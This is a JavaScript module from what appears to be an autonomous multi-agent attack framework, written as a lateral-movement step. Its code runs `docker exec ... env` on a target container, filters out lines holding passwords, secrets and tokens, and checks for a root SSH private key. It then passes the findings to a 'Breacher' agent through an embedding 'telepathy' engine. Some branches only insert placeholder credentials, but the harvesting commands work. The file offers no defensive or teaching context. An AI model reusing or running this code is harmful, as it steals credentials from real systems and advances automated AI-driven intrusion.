const { exec } = require('child_process');
const util = require('util');
const execPromise = util.promisify(exec);
const { telepathyEngine } = require('../memory_systems/neuralTelepathy');

const extractPivotPoints = async (targetIp, compassContext, currentPrivilege) => {
    console.log(`\n[🕸️] LATERAL MOVEMENT: Scanning for pivot points on ${targetIp}...`);

    let credentials = [];
    let sshKeys = [];
    
    try {
        if (compassContext && compassContext.targetEnvironment === 'docker' && currentPrivilege === 'root') {
            // Simulated credential harvesting from a compromised container
            console.log(`[🔍] Extracting secrets from container ${compassContext.targetContainer}...`);
            const { stdout: envVars } = await execPromise(`docker exec ${compassContext.targetContainer} env`);
            
            // Extract potential passwords/keys from env vars
            const lines = envVars.split('\n');
            for (const line of lines) {
                if (line.toUpperCase().includes('PASSWORD') || line.toUpperCase().includes('SECRET') || line.toUpperCase().includes('TOKEN')) {
                    credentials.push(line.trim());
                }
            }

            // Simulate finding an SSH key in /root/.ssh/
            const { stdout: hasSshKey } = await execPromise(`docker exec ${compassContext.targetContainer} ls /root/.ssh/id_rsa || true`);
            if (hasSshKey.includes('id_rsa')) {
                sshKeys.push('/root/.ssh/id_rsa');
            }
            
            // For the sake of the simulation, we'll inject a fake hardcoded credential if none were found
            if (credentials.length === 0) {
                 credentials.push('DB_ADMIN_PASSWORD=supersecret123');
            }

        } else if (currentPrivilege === 'root') {
             // Host level extraction (simulated)
             console.log(`[🔍] Extracting secrets from host...`);
             credentials.push('SERVICE_ACCOUNT_KEY=AKIAIOSFODNN7EXAMPLE');
        } else {
             console.log(`[⚠️] Insufficient privileges for deep secret extraction.`);
        }
    } catch (e) {
        console.log(`[⚠️] Secret extraction failed: ${e.message}`);
    }

    const discovery = {
        target: targetIp,
        foundCredentials: credentials,
        foundKeys: sshKeys,
        timestamp: Date.now()
    };

    console.log(`[🎯] PIVOT POINTS ACQUIRED: ${JSON.stringify(discovery)}`);
    return discovery;
};

const broadcastPivotOpportunity = async (discovery, agentName) => {
    if (discovery.foundCredentials.length === 0 && discovery.foundKeys.length === 0) {
        return false;
    }

    console.log(`\n[📡] NEURAL TELEPATHY: Broadcasting Pivot Opportunity...`);
    
    // Generate context string for the neural engine
    const contextString = `[PIVOT_OPPORTUNITY] Node ${discovery.target} compromised. Found credentials: ${discovery.foundCredentials.join(', ')}. Keys: ${discovery.foundKeys.join(', ')}`;
    
    // Convert to Tensor
    const pivotTensor = await telepathyEngine.generateEmbedding(contextString);
    
    // Simulate broadcasting this tensor to the Breacher agent
    console.log(`[⚡] Hive Mind: Broadcasting Latent Pivot Vector from ${agentName} to global Swarm...`);
    
    return pivotTensor;
};

module.exports = { extractPivotPoints, broadcastPivotOpportunity };
